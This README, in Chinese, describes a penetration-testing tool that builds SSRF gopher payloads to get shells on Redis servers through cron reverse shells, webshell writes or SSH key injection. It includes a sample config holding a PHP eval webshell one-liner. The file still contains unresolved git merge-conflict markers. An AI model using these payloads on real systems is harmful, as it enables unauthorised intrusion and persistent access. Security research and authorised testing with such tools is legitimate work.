<<<<<<< HEAD
# ssrf_redis_getshell
通过ssrf漏洞对redis资产进行getshell的常见姿势

一、使用方法

1.需手动在代码中修改对应的ip和端口，以及三种方式所需的配置信息

2.所需环境: python2

example:
![image](https://user-images.githubusercontent.com/50257557/173984487-5a98d409-b68c-4c1f-be86-f0158aaae109.png)
输入想获取哪种类型的payload，curl即一次编码，burp对应的即为两次编码
![image](https://user-images.githubusercontent.com/50257557/173984651-b8ade100-4438-4d5f-af20-423d26ed049b.png)
=======
# Redis SSRF Payload 生成器

一个用于生成Redis SSRF漏洞利用payload的工具，支持多种getshell方式。**本工具仅用于安全研究和防御测试目的。**

## 功能特性

- 三种Redis SSRF利用方式：
  - 定时任务反弹shell
  - 网站绝对路径写webshell  
  - Redis写入SSH公钥
- 交互式配置管理
- 支持配置文件保存和加载
- 自动生成curl和burp格式的payload
- 输入验证和错误处理
- Python 3兼容

## 环境要求

- Python 3.6+
- 标准库模块：`urllib.parse`, `json`, `os`, `ipaddress`

## 安装和使用

### 1. 克隆或下载项目

```bash
git clone <repository-url>
cd ssrf_redis_getshell-main
```

### 2. 运行程序

```bash
python3 ssrf_redis_all.py
```

### 3. 使用交互式菜单

程序启动后会显示主菜单：

```
==================================================
Redis SSRF Payload 生成器
==================================================
1. 定时任务反弹shell (cron)
2. 网站绝对路径写webshell (web)
3. Redis写入SSH公钥 (ssh)
4. 查看当前配置
5. 编辑并保存配置
6. 加载配置文件
7. 退出
==================================================
```

## 功能说明

### 生成Payload (选项1-3)
选择对应的利用方式，程序会自动生成两种格式的payload：
- **curl格式**：一次URL编码，适用于curl命令行测试
- **burp格式**：二次URL编码，适用于Burp Suite等渗透测试工具

### 配置管理 (选项4-6)

#### 查看当前配置 (选项4)
显示当前的所有配置参数，包括：
- Redis连接信息
- 反弹shell配置
- Webshell路径和内容
- SSH公钥配置

#### 编辑并保存配置 (选项5)
交互式修改所有配置参数，修改完成后会自动保存到JSON文件中。

#### 加载配置文件 (选项6)
从已有的JSON配置文件中加载配置参数。

## 配置文件格式

配置文件为JSON格式，包含以下配置节：

```json
{
  "redis": {
    "protocol": "gopher://",
    "ip": "127.0.0.1",
    "port": "6379",
    "password": ""
  },
  "cron": {
    "reverse_ip": "127.0.0.1",
    "reverse_port": "4444",
    "filename": "root",
    "path": "/var/spool/cron"
  },
  "webshell": {
    "shell_content": "<?php eval($_GET[1]);?>",
    "filename": "shell.php",
    "path": "/var/www/html"
  },
  "ssh": {
    "public_key": "ssh-rsa AAAAB3NzaC1yc2E...",
    "filename": "authorized_keys",
    "path": "/root/.ssh/"
  }
}
```

## 注意事项

1. **合法使用**：本工具仅用于授权的安全测试和研究目的
2. **输入验证**：程序会验证IP地址格式和端口号范围
3. **配置备份**：建议为不同测试环境创建单独的配置文件
4. **Python版本**：需要Python 3.6或更高版本

## 更新日志

### v2.0 (重构版)
- 升级到Python 3
- 添加配置文件支持
- 实现交互式配置管理
- 增强错误处理和输入验证
- 优化代码结构和用户体验

### v1.0 (原版)
- 基础payload生成功能
- Python 2支持

## 免责声明

本工具仅供安全研究和授权测试使用。使用者需确保遵守当地法律法规，对使用本工具造成的任何后果承担责任。开发者不对任何非法使用承担责任。
>>>>>>> 267d0eb (代码重构)
